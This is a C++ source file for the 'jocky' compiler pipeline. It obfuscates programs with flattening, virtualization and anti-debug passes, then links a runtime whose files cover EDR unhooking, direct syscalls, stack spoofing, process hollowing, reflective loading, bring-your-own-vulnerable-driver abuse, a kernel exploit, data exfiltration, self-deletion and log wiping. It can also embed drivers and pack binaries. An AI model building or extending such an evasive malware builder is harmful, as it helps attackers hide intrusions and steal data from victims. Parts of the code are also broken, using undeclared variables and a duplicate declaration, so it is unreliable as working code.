#include "pipeline.h"
#include "lexer.h"
#include "parser.h"
#include "codegen.h"
#include "packer.h"
#include <cstdlib>
#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <cstdio>
#include <filesystem>
#include <random>
#include <llvm/Support/raw_ostream.h>
#include <llvm/Support/FileSystem.h>

namespace jocky {

static bool exec(const std::string& cmd) {
    int ret = std::system(cmd.c_str());
    return ret == 0;
}

static std::string getTargetFlag(const CompileOptions& opts) {
    if (!opts.target.empty()) {
        return "--target=" + opts.target + " ";
    }
    return "";
}

bool Pipeline::findMsvcToolchain(std::string& outClangCl, std::string& outLldLink,
                                 std::string& outWindowsSdk, std::string& outVcTools) {
#ifdef _WIN32
    std::string vswhere_path = "C:/Program Files (x86)/Microsoft Visual Studio/Installer/vswhere.exe";
    std::string vc_install_dir;
    std::string windows_sdk_dir;
    
    if (std::filesystem::exists(vswhere_path)) {
        std::string cmd = vswhere_path + " -latest -products * -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 -property installationPath";
        FILE* pipe = _popen(cmd.c_str(), "r");
        if (pipe) {
            char buffer[512];
            if (fgets(buffer, sizeof(buffer), pipe)) {
                vc_install_dir = buffer;
                vc_install_dir.erase(vc_install_dir.find_last_not_of(" \n\r\t") + 1);
            }
            _pclose(pipe);
        }
    }
    
    if (vc_install_dir.empty()) {
        const char* vcinst = std::getenv("VSINSTALLDIR");
        if (vcinst) vc_install_dir = vcinst;
    }
    
    if (vc_install_dir.empty()) {
        std::vector<std::string> candidates = {
            "C:/Program Files/Microsoft Visual Studio/2022/Community",
            "C:/Program Files/Microsoft Visual Studio/2022/Professional",
            "C:/Program Files/Microsoft Visual Studio/2022/Enterprise",
            "C:/Program Files/Microsoft Visual Studio/2019/Community",
            "C:/Program Files/Microsoft Visual Studio/2019/Professional",
            "C:/Program Files/Microsoft Visual Studio/2019/Enterprise",
        };
        for (const auto& cand : candidates) {
            if (std::filesystem::exists(cand + "/VC/Tools/MSVC")) {
                vc_install_dir = cand;
                break;
            }
        }
    }
    
    if (vc_install_dir.empty()) return false;
    
    std::string vc_tools_path = vc_install_dir + "/VC/Tools/MSVC";
    if (!std::filesystem::exists(vc_tools_path)) return false;
    
    std::string latest_version;
    for (const auto& entry : std::filesystem::directory_iterator(vc_tools_path)) {
        if (entry.is_directory()) {
            std::string name = entry.path().filename().string();
            if (name > latest_version) latest_version = name;
        }
    }
    if (latest_version.empty()) return false;
    
    std::string vc_tools = vc_tools_path + "/" + latest_version;
    
    const char* sdkDir = std::getenv("WindowsSdkDir");
    std::string windows_sdk_dir;
    if (sdkDir) {
        windows_sdk_dir = sdkDir;
    } else {
        std::vector<std::string> sdk_candidates = {
            "C:/Program Files (x86)/Windows Kits/10",
            "C:/Program Files/Windows Kits/10",
        };
        for (const auto& cand : sdk_candidates) {
            if (std::filesystem::exists(cand)) {
                windows_sdk_dir = cand;
                break;
            }
        }
    }
    
    if (windows_sdk_dir.empty()) {
        std::cerr << "[!] Windows SDK not found\n";
        return false;
    }
    
    outClangCl = vc_tools + "/bin/Hostx64/x64/clang-cl.exe";
    outLldLink = vc_tools + "/bin/Hostx64/x64/lld-link.exe";
    outWindowsSdk = windows_sdk_dir;
    outVcTools = vc_tools;
    
    return std::filesystem::exists(outClangCl) && std::filesystem::exists(outLldLink);
#else
    (void)outClangCl; (void)outLldLink; (void)outWindowsSdk; (void)outVcTools;
    return false;
#endif
}

bool Pipeline::findToolchain(const CompileOptions& opts, std::string& outClang, std::string& outOpt, std::string& outPlugin) {
    if (opts.useMsvc) {
#ifdef _WIN32
        std::string clang_cl, lld_link, windows_sdk, vc_tools;
        if (findMsvcToolchain(outClang, outOpt, outWindowsSdk, outVcTools)) {
            return true;
        }
#endif
        std::cerr << "[!] MSVC toolchain requested but not found\n";
        return false;
    }
    
    const char* env = std::getenv("JOCKY_LLVM_TOOLCHAIN");
    std::string prefix;
    if (env) {
        prefix = env;
    } else {
        const char* path = std::getenv("PATH");
        if (path) {
            std::stringstream ss(path);
            std::string dir;
#ifdef _WIN32
            while (std::getline(ss, dir, ';')) {
                std::string clang = dir + "/clang.exe";
                std::string opt = dir + "/opt.exe";
#else
            while (std::getline(ss, dir, ':')) {
                std::string clang = dir + "/clang";
                std::string opt = dir + "/opt";
#endif
                if (std::filesystem::exists(clang) && std::filesystem::exists(opt)) {
                    prefix = dir + "/..";
                    break;
                }
            }
        }
        if (prefix.empty()) {
#ifdef _WIN32
            std::vector<std::string> candidates = {
                "C:/Program Files/LLVM",
                "C:/LLVM",
            };
            namespace fs = std::filesystem;
            fs::path compilerSrc = fs::path(__FILE__).parent_path().parent_path();
            candidates.push_back((compilerSrc / ".." / "llvm").string());
            for (const auto& cand : candidates) {
                if (std::filesystem::exists(cand + "/bin/clang.exe")) {
                    prefix = cand;
                    break;
                }
            }
#else
            // Check JOCKY_LLVM_ROOT env var first, then probe distro paths
            const char* envRoot = std::getenv("JOCKY_LLVM_ROOT");
            if (envRoot && std::filesystem::exists(std::string(envRoot) + "/bin/clang")) {
                prefix = envRoot;
            } else {
                for (const std::string ver : {"19", "18", "17", "16", "15"}) {
                    std::string cand = "/usr/lib/llvm-" + ver;
                    if (std::filesystem::exists(cand + "/bin/clang")) {
                        prefix = cand;
                        break;
                    }
                }
            }
#endif
        }
    }

#ifdef _WIN32
    outClang = prefix + "/bin/clang.exe";
    outOpt = prefix + "/bin/opt.exe";
    outPlugin = prefix + "/lib/LLVMObfuscationPlugin.dll";
#else
    outClang = prefix + "/bin/clang";
    outOpt = prefix + "/bin/opt";
    outPlugin = prefix + "/lib/LLVMObfuscationPlugin.so";
#endif

    if (!std::filesystem::exists(outClang)) {
        std::cerr << "[!] clang not found: " << outClang << "\n";
        return false;
    }
    if (!std::filesystem::exists(outOpt)) {
        std::cerr << "[!] opt not found: " << outOpt << "\n";
        return false;
    }
    return true;
}

bool Pipeline::findMLIRTools(std::string& outTranslate, std::string& outMlirOpt, std::string& outMlirPlugin) {
    std::string clang, opt, llvmPlugin;
    if (!findToolchain(CompileOptions{}, clang, opt, llvmPlugin)) return false;

    std::string prefix = clang.substr(0, clang.find_last_of("/\\"));
    prefix = prefix.substr(0, prefix.find_last_of("/\\"));

#ifdef _WIN32
    outTranslate = prefix + "/bin/mlir-translate.exe";
    outMlirOpt = prefix + "/bin/mlir-opt.exe";
    outMlirPlugin = prefix + "/lib/MLIRObfuscationPlugin.dll";
#else
    outTranslate = prefix + "/bin/mlir-translate";
    outMlirOpt = prefix + "/bin/mlir-opt";
    outMlirPlugin = prefix + "/lib/MLIRObfuscationPlugin.so";
#endif

    if (!std::filesystem::exists(outTranslate)) {
        std::cerr << "[!] mlir-translate not found: " << outTranslate << "\n";
        return false;
    }
    if (!std::filesystem::exists(outMlirOpt)) {
        std::cerr << "[!] mlir-opt not found: " << outMlirOpt << "\n";
        return false;
    }
    return true;
}

bool Pipeline::runMLIRObfuscation(const std::string& inLl, const std::string& outLl,
                                  const std::string& translate, const std::string& mlirOpt,
                                  const std::string& mlirPlugin) {
    std::string mlirPath = inLl + ".tmp.mlir";
    std::string encMlirPath = inLl + ".tmp.enc.mlir";

    std::string cmd1 = translate + " --import-llvm " + inLl + " -o " + mlirPath;
    if (!exec(cmd1)) {
        std::cerr << "[!] Failed to convert LLVM IR to MLIR\n";
        return false;
    }

    std::string cmd2 = mlirOpt + " --load-pass-plugin=" + mlirPlugin +
                       " --symbol-obfuscate " +
                       " --crypto-hash " +
                       " --string-encrypt " +
                       " --constant-obfuscate " +
                       " --import-obfuscate " +
                       " --scf-obfuscate " +
                       mlirPath + " -o " + encMlirPath;
    if (!exec(cmd2)) {
        std::cerr << "[!] MLIR string encryption failed\n";
        return false;
    }

    std::string cmd3 = translate + " --mlir-to-llvmir " + encMlirPath + " -o " + outLl;
    if (!exec(cmd3)) {
        std::cerr << "[!] Failed to convert MLIR back to LLVM IR\n";
        return false;
    }

    std::filesystem::remove(mlirPath);
    std::filesystem::remove(encMlirPath);
    return true;
}

bool Pipeline::emitLLVMIR(const CompileOptions& opts, const std::string& llPath) {
    std::string clang, opt, plugin;
    if (!findToolchain(opts, clang, opt, plugin)) return false;

    if (opts.isCInput) {
        std::string targetFlag = getTargetFlag(opts);
        
        std::vector<std::string> sysIncludes;
        bool isWindowsTarget = !opts.target.empty() && 
            (opts.target.find("windows") != std::string::npos || 
             opts.target.find("mingw") != std::string::npos || 
             opts.target.find("msvc") != std::string::npos);
        
        if (isWindowsTarget) {
            sysIncludes = {
                "/usr/lib/llvm-17/lib/clang/17/include",
                "/usr/lib/llvm-18/lib/clang/18/include",
                "/usr/lib/llvm-19/lib/clang/19/include",
                "/usr/x86_64-w64-mingw32/include",
            };
            const char* vcinst = std::getenv("VCINSTALLDIR");
            if (vcinst) {
                sysIncludes.push_back(std::string(vcinst) + "/VC/Tools/MSVC/Current/Include");
            }
            const char* sdkDir = std::getenv("WindowsSdkDir");
            if (sdkDir) {
                sysIncludes.push_back(std::string(sdkDir) + "/Include/10.0.19041.0/ucrt");
            }
        } else {
            sysIncludes = {
                "/usr/include",
                "/usr/include/x86_64-linux-gnu",
                "/usr/lib/gcc/x86_64-linux-gnu/15/include",
                "/usr/lib/gcc/x86_64-linux-gnu/16/include",
                "/usr/lib/llvm-17/lib/clang/17/include",
                "/usr/lib/llvm-18/lib/clang/18/include",
                "/usr/lib/llvm-19/lib/clang/19/include",
            };
        }
        
        std::string incFlags;
        for (const auto& inc : sysIncludes) {
            if (std::filesystem::exists(inc)) {
                incFlags += " -isystem " + inc;
            }
        }
        
        std::string extraFlags;
        if (isWindowsTarget) {
            extraFlags = "-mno-mmx -mno-sse -mno-sse2 ";
        }
        
        std::string cmd = clang + " " + targetFlag + extraFlags + "-O1 -S -emit-llvm -Wno-override-module " + 
                          incFlags + " " + opts.inputFile + " -o " + llPath;
        if (!exec(cmd)) {
            std::cerr << "[!] Failed to generate LLVM IR from C source\n";
            return false;
        }
    } else {
        std::ifstream in(opts.inputFile);
        if (!in) {
            std::cerr << "[!] Cannot open: " << opts.inputFile << "\n";
            return false;
        }
        std::string source((std::istreambuf_iterator<char>(in)),
                            std::istreambuf_iterator<char>());

        try {
            Lexer lexer(source);
            auto tokens = lexer.tokenize();

            Parser parser(std::move(tokens));
            auto ast = parser.parse();

            CodeGen codegen(opts.noRuntime);
            // Generate unique seed for token diversification per build
            std::random_device rd;
            std::mt19937_64 rng(rd());
            std::uniform_int_distribution<uint64_t> dist;
            uint64_t seed = dist(rng);
            codegen.setTokenSeed(seed);
            std::cout << "[*] Token diversification seed: " << seed << "\n";
            auto mod = codegen.generate(*ast, opts.inputFile);

            std::error_code ec;
            llvm::raw_fd_ostream out(llPath, ec);
            if (ec) {
                std::cerr << "[!] Cannot write " << llPath << ": " << ec.message() << "\n";
                return false;
            }
            mod->print(out, nullptr);
        } catch (const std::exception& e) {
            std::cerr << "[!] Compilation error: " << e.what() << "\n";
            return false;
        }
    }
    return true;
}

bool Pipeline::runObfuscation(const CompileOptions& opts, const std::string& inBc, const std::string& outBc) {
    std::string clang, opt, plugin;
    if (!findToolchain(opts, clang, opt, plugin)) return false;

    std::string targetFlag = getTargetFlag(opts);
    std::string cmd1 = clang + " " + targetFlag + "-O1 -c -emit-llvm -x ir -Wno-override-module " + inBc + " -o " + inBc + ".tmp.bc";
    if (!exec(cmd1)) {
        std::cerr << "[!] Failed to compile IR to bitcode\n";
        return false;
    }

    std::string passes;
    if (opts.profile == "none") {
        passes = "";
    } else if (opts.profile == "light") {
        passes = "function(substitution)";
    } else if (opts.profile == "standard") {
        passes = "function(boguscf,flattening,substitution,linear-mba,opaque-pred)";
    } else if (opts.profile == "aggressive") {
        passes = "strip-signature,function(boguscf,flattening,substitution,split,linear-mba,opaque-pred),anti-debug,indirect-call,virtualize";
    } else if (opts.profile == "paranoid") {
        passes = "strip-signature,pdata-strip,function(boguscf,flattening,substitution,split,linear-mba,opaque-pred),anti-debug,indirect-call,virtualize";
    } else {
        std::cerr << "[!] Unknown profile: " << opts.profile << ", using standard\n";
        passes = "function(boguscf,flattening,substitution,linear-mba,opaque-pred)";
    }

    if (!passes.empty()) {
        std::string cmd2 = opt + " -load-pass-plugin=" + plugin +
                           " -passes='" + passes + "' " +
                           inBc + ".tmp.bc -o " + outBc;
        if (!exec(cmd2)) {
            std::cerr << "[!] Obfuscation passes failed\n";
            return false;
        }
    } else {
        std::filesystem::copy(inBc + ".tmp.bc", outBc,
                              std::filesystem::copy_options::overwrite_existing);
    }

    std::filesystem::remove(inBc + ".tmp.bc");
    return true;
}

bool Pipeline::compileToObject(const CompileOptions& opts, const std::string& bc, const std::string& obj) {
    std::string clang, opt, plugin;
    if (!findToolchain(opts, clang, opt, plugin)) return false;

    std::string targetFlag = getTargetFlag(opts);
    std::string cmd = clang + " " + targetFlag + "-c " + bc + " -o " + obj;
    return exec(cmd);
}

bool Pipeline::compileRuntime(const std::string& clang, const std::string& outDir,
                              std::vector<std::string>& outObjs, const std::string& targetFlag, bool noRuntime, bool byovd) {
    namespace fs = std::filesystem;

    fs::path compilerSrc = fs::path(__FILE__).parent_path().parent_path();
    fs::path runtimeDir = compilerSrc / ".." / "src" / "runtime";
    fs::path includeDir = runtimeDir / "include";

    if (!fs::exists(runtimeDir)) {
        std::cerr << "[!] Runtime directory not found: " << runtimeDir << "\n";
        return false;
    }

    std::vector<std::string> sysIncludes;
    bool isWindowsTarget = targetFlag.find("windows") != std::string::npos || targetFlag.find("mingw") != std::string::npos || targetFlag.find("msvc") != std::string::npos;
    
    if (isWindowsTarget) {
        sysIncludes = {
            "C:/Program Files/LLVM/lib/clang/17/include",
            "C:/Program Files/LLVM/lib/clang/18/include",
            "C:/Program Files/LLVM/lib/clang/19/include",
        };
        const char* vcinst = std::getenv("VCINSTALLDIR");
        if (vcinst) {
            sysIncludes.push_back(std::string(vcinst) + "/VC/Tools/MSVC/Current/Include");
        }
        const char* sdkDir = std::getenv("WindowsSdkDir");
        if (sdkDir) {
            sysIncludes.push_back(std::string(sdkDir) + "/Include/10.0.19041.0/ucrt");
        }
    } else {
        sysIncludes = {
            "/usr/include",
            "/usr/include/x86_64-linux-gnu",
            "/usr/lib/gcc/x86_64-linux-gnu/15/include",
            "/usr/lib/gcc/x86_64-linux-gnu/16/include",
            "/usr/lib/llvm-17/lib/clang/17/include",
            "/usr/lib/llvm-18/lib/clang/18/include",
            "/usr/lib/llvm-19/lib/clang/19/include",
        };
    }
    std::string incFlags = "-I" + includeDir.string();
    for (const auto& inc : sysIncludes) {
        if (fs::exists(inc)) {
            incFlags += " -isystem " + inc;
        }
    }

    std::vector<fs::path> sources = {
        runtimeDir / "init"    / "anti_analysis.c",
        runtimeDir / "cleanup" / "self_delete.c",
        runtimeDir / "cleanup" / "logs.c",
        runtimeDir / "vm" / "vm_interpreter.c",
        runtimeDir / "forensics" / "forensics_rt.c",
    };

    if (isWindowsTarget && !noRuntime) {
        sources.push_back(runtimeDir / "evasion"      / "unhook.c");
        sources.push_back(runtimeDir / "evasion"      / "syscalls.c");
        sources.push_back(runtimeDir / "evasion"      / "stack_spoof.c");
        sources.push_back(runtimeDir / "execution"    / "hollow.c");
        sources.push_back(runtimeDir / "execution"    / "reflective.c");
        sources.push_back(runtimeDir / "execution"    / "byovd.c");
        sources.push_back(runtimeDir / "execution"    / "inmem.c");
        sources.push_back(runtimeDir / "execution"    / "driver_interact.c");
        sources.push_back(runtimeDir / "exploitation" / "kernel_exploit.c");
        sources.push_back(runtimeDir / "exfil"        / "exfil.c");
        sources.push_back(runtimeDir / "cleanup"      / "forensics.c");
        sources.push_back(runtimeDir / "pack"         / "stub_loader.c");
    }

    if (byovd && isWindowsTarget) {
        fs::path byovdDir = runtimeDir / "byovd";
        incFlags += " -I" + byovdDir.string();
        sources.push_back(byovdDir / "byovd_modular.c");
    } else if (!isWindowsTarget && !noRuntime) {
        sources.push_back(runtimeDir / "execution" / "linux_inject.c");
    }

    for (const auto& src : sources) {
        if (!fs::exists(src)) continue;

        fs::path obj = fs::path(outDir) / (src.stem().string() + ".o");
        std::string cmd = clang + " " + targetFlag + "-O2 -c " + incFlags + " " + src.string() + " -o " + obj.string();
        if (!exec(cmd)) {
            std::cerr << "[!] Failed to compile runtime: " << src << "\n";
            return false;
        }
        outObjs.push_back(obj.string());
    }

    return true;
}

bool Pipeline::linkExecutable(const CompileOptions& opts, const std::string& clang,
                              const std::string& obj, const std::vector<std::string>& runtimeObjs,
                              const std::string& exe) {
    std::string targetFlag = getTargetFlag(opts);
    std::string cmd = clang + " " + targetFlag;
    if (opts.staticLink) {
        cmd += "-static ";
    }
    cmd += obj;
    for (const auto& ro : runtimeObjs) {
        cmd += " " + ro;
    }
    cmd += " -o " + exe;
    bool isWindowsTarget = targetFlag.find("windows") != std::string::npos || targetFlag.find("mingw") != std::string::npos || targetFlag.find("msvc") != std::string::npos;
    if (isWindowsTarget) {
        cmd += " -lntdll";
    } else if (!opts.staticLink) {
        cmd += " -ldl -lpthread";
    }
    return exec(cmd);
}

bool Pipeline::run(const CompileOptions& opts) {
    std::string base = opts.inputFile;
    size_t dot = base.find_last_of('.');
    if (dot != std::string::npos) base = base.substr(0, dot);

    bool isWindowsTarget = !opts.target.empty() && 
        (opts.target.find("windows") != std::string::npos || 
         opts.target.find("mingw") != std::string::npos || 
         opts.target.find("msvc") != std::string::npos);

    std::string llPath = base + ".ll";
    std::string bcPath = base + ".obf.bc";
    std::string objPath = base + (isWindowsTarget ? ".obj" : ".o");
    std::string exePath = opts.outputFile;

    std::cout << "[*] Parsing and generating LLVM IR...\n";
    if (!emitLLVMIR(opts, llPath)) return false;

    if (opts.encryptStrings) {
        std::cout << "[*] Encrypting strings via MLIR...\n";
        std::string translate, mlirOpt, mlirPlugin;
        if (!findMLIRTools(translate, mlirOpt, mlirPlugin)) {
            std::cerr << "[!] MLIR tools not found, skipping string encryption\n";
        } else {
            std::string encLlPath = llPath + ".enc.ll";
            if (runMLIRObfuscation(llPath, encLlPath, translate, mlirOpt, mlirPlugin)) {
                std::filesystem::remove(llPath);
                std::filesystem::rename(encLlPath, llPath);
            } else {
                std::cerr << "[!] String encryption failed, continuing with plaintext strings\n";
            }
        }
    }

    std::cout << "[*] Running obfuscation passes (profile: " << opts.profile << ")....\n";
    if (!runObfuscation(opts, llPath, bcPath)) return false;

    std::cout << "[*] Compiling to object...\n";
    if (!compileToObject(opts, bcPath, objPath)) return false;

    std::string clang, opt, plugin;
    if (!findToolchain(opts, clang, opt, plugin)) return false;

    std::vector<std::string> runtimeObjs;
    std::string outDir = base + ".build";
    std::string targetFlag = getTargetFlag(opts);
    if (!opts.noRuntime) {
        std::cout << "[*] Compiling runtime library...\n";
        std::filesystem::create_directories(outDir);
        if (!compileRuntime(clang, outDir, runtimeObjs, targetFlag, opts.noRuntime, opts.byovd)) {
            std::cerr << "[!] Runtime compilation failed\n";
            return false;
        }
    }

    std::cout << "[*] Linking executable...\n";
    if (!linkExecutable(opts, clang, objPath, runtimeObjs, exePath)) return false;

    std::cout << "[+] Build succeeded: " << exePath << "\n";

    // ── Step 1: embed driver (before anti-tamper so it is covered by the hash)
    if (!opts.embedDriverPath.empty()) {
        if (!isWindowsTarget) {
            std::cerr << "[!] --embed-driver is only supported for Windows targets\n";
        } else {
            std::cout << "[*] Embedding driver: " << opts.embedDriverPath << "\n";
            if (!embedDriver(exePath, opts.embedDriverPath)) {
                std::cerr << "[!] Warning: driver embedding failed\n";
            }
        }
    }

    // ── Step 1b: embed driver interaction manifest (Windows only, before hash)
    if (!opts.manifestPath.empty()) {
        if (!isWindowsTarget) {
            std::cerr << "[!] --manifest is only supported for Windows targets\n";
        } else {
            std::cout << "[*] Embedding driver manifest: " << opts.manifestPath << "\n";
            if (!embedManifest(exePath, opts.manifestPath)) {
                std::cerr << "[!] Warning: manifest embedding failed\n";
            }
        }
    }

    // ── Step 2: section encryption (Windows) or UPX (Linux)
    if (opts.pack) {
        if (isWindowsTarget) {
            std::cout << "[*] Encrypting PE sections (.text/.rdata)...\n";
            if (!packPE(exePath)) {
                std::cerr << "[!] Warning: PE section encryption failed\n";
            }
        } else {
            std::cout << "[*] Packing binary with UPX...\n";
            std::string upx = "/tmp/upx";
            if (!std::filesystem::exists(upx)) upx = "upx";
            std::string cmd = upx + " --best " + exePath + " 2>/dev/null";
            if (!exec(cmd)) {
                std::cerr << "[!] Warning: UPX not found or failed; binary not packed.\n";
            }
        }
    }

    // ── Step 3: anti-tamper (Windows only, always last so hash covers everything)
    if (isWindowsTarget) {
        std::cout << "[*] Injecting anti-tamper checksum (.jtamp)...\n";
        if (!addAntiTamper(exePath)) {
            std::cerr << "[!] Warning: anti-tamper injection failed\n";
        }
    }

    if (!opts.keepIntermediates) {
        std::filesystem::remove_all(llPath);
        std::filesystem::remove_all(bcPath);
        std::filesystem::remove_all(objPath);
        if (!opts.noRuntime) {
            std::filesystem::remove_all(outDir);
        }
    }

    return true;
}

} // namespace jocky
